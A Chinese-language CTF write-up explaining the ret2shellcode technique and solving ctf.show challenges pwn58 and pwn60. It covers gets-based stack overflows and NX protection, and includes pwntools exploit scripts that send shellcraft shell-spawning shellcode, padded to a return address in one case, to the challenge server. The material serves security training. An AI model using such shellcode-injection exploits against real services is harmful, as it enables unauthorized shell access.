## ctf ret2shellcode

ret2shellcode，即控制程序执行shellcode代码。shellcode指的是用于完成某种功能的汇编代码，常见的功能主要是获取目标系统的shell。一般来说，shellcode需要自己填充。这其实是另一种典型的利用方式，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行shellcode，需要shellcode所在的区域具有可执行的权限

1.篡改栈帧商店返回地址为攻击者手动传入的shellcode所在缓冲地址

2.初期往往蒋shellcode直接写入到栈缓冲区中

3.目前由于the NX bits保护措施的开启，栈缓冲区不可执行，因此这也是当下常用变相bss缓冲区写入shellcode或者向堆缓冲区写入shellcode并使用mprotect赋予其可执行权限

---

### pwn58

![image-20241116201210099](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241116201210099.png)

这里存在一个可以读可写可执行的数据段因此我们可以扔到ida中

![image-20241116202949797](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241116202949797.png)

看报错应该是这里无法进行反编译，流程其实也能很清楚的看出来，跟之前差不多，看到后面这里 调用了ctfshow函数，经验之谈漏洞点应该是在这的 ：

 看到有gets函数的调用，看汇编： ![image-20241116203057963](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241116203057963.png)

我们可以看出对gets函数调用，参数对应的是 [ebp+s] 的地址,也就是在返回地址上一栈内存单元 处，对应主函数中，我们可以看到: ![image-20241116203109118](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241116203109118.png)

gets 函数写入的地址即为 [ebp+s] 对应的地址，同时我们注意到: ![image-20241116203123228](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241116203123228.png)

call 的地址即为 [ebp+s] 所指向的地址 到这里思路就很明显了，我们先输入的内容会被 get 读取，存到内存 [ebp+s] 中，然后在函数在后 面的时候，会调用这一部分内容。所以我们只要写入 shellcode ，函数后面就会调用 shellcode 。至于 [ebp+s] 是指向哪里 ，我们可以看到 main 函数中没有 offset 变量，所以这 [ebp+s] 指的是局部变量， 那就是在栈中，而 nx 保护没有开启，所以 shellcode 在栈上也可以执行。 故我们可以直接使用

pwntools的shellcraft模块帮我们生成一个shellcode进行攻击。

而shellcode的模块攻击默认用32位的因此我们要用64位的因此exp：

```python
from pwn import *


context.log_level='debug'
# io = process("/home/fofa/pwn")
io = remote("pwn.challenge.ctf.show", 28297)
payload= asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
```

exp64:

```python
from pwn import*
context(log_level = 'debug', arch = 'amd64')
# io = process("/home/fofa/pwn")
io = remote("pwn.challenge.ctf.show", 28128)
payload= asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
```

---

### pwn60

![image-20241119182343335](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241119182343335.png)

这里发现了一个栈溢出但是这里的64h+4并不是他需要的溢出地址这里就要使用gdb进行调试可以发现一个溢出地址因此优先gdb的因此溢出地址为112并且需要把shellcode写入到buf2中去因此他的exp：

```python
from pwn import *

# io = process("/home/fofa/pwn")
io = remote("pwn.challenge.ctf.show", 28218)
buf2_addr = 0x0804A080
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(112,b'a') + p32(buf2_addr)
io.sendline(payload)
io.interactive()
```

---

